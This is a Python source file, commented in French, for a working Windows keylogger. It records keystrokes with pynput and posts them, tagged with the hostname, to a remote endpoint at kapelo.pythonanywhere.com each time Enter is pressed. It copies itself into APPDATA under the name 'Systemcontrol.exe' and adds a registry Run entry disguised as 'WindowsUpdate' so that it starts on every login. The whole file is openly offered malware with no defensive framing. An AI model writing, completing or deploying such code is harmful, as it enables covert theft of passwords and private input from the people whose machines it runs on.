from pynput import keyboard
import requests
import json
import socket
from datetime import datetime
import winreg  # Pour modifier le registre Windows
import os
import shutil
import sys

class Keylogger:
    def __init__(self):
        self.logs = ""
        self.machine_id = socket.gethostname()
        self.api_url = "https://kapelo.pythonanywhere.com/log"
        # Chemin où le programme sera copié pour persistance
        self.persist_path = os.path.join(os.getenv("APPDATA"), "Systemcontrol.exe")
        print(f"Keylogger démarré sur {self.machine_id}")
        self.ensure_persistence()

    def ensure_persistence(self):
        """Ajoute le programme au démarrage via le registre Windows"""
        try:
            # Vérifier si le script est déjà un .exe (lorsqu'il est compilé)
            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__

            # Copier le fichier .exe dans un emplacement persistant (si pas déjà là)
            if not os.path.exists(self.persist_path):
                shutil.copyfile(exe_path, self.persist_path)
                print(f"Programme copié vers : {self.persist_path}")

            # Ajouter au registre pour démarrer automatiquement
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, self.persist_path)
                print("Programme ajouté au démarrage via le registre.")
        except Exception as e:
            print(f"Erreur lors de la configuration de la persistance : {e}")

    def _format_key(self, key):
        """Formater les touches de manière plus lisible"""
        if key == keyboard.Key.backspace:
            if self.logs:
                self.logs = self.logs[:-1]
            return ""
        if key == keyboard.Key.space:
            return " "
        if hasattr(key, 'char'):
            return str(key.char)
        return ""

    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                print(f"Envoi des données: {self.logs}")
                self.send_logs()
                return
            current_key = self._format_key(key)
            if current_key != "":
                self.logs += current_key
            print(f"Buffer actuel: {self.logs}")
        except Exception as e:
            print(f"Erreur lors de la capture: {e}")

    def send_logs(self):
        """Envoyer les logs au serveur"""
        if not self.logs.strip():
            return
        try:
            data = {
                "machine_id": self.machine_id,
                "timestamp": datetime.now().isoformat(),
                "keystrokes": self.logs
            }
            print(f"Tentative d'envoi: {data}")
            response = requests.post(
                self.api_url,
                json=data,
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                print("Données envoyées avec succès!")
                self.logs = ""
            else:
                print(f"Erreur lors de l'envoi: {response.status_code}")
        except Exception as e:
            print(f"Erreur d'envoi: {e}")

    def start(self):
        print("Démarrage du keylogger...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            print("En écoute des touches...")
            listener.join()

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except Exception as e:
        print(f"Erreur critique: {e}")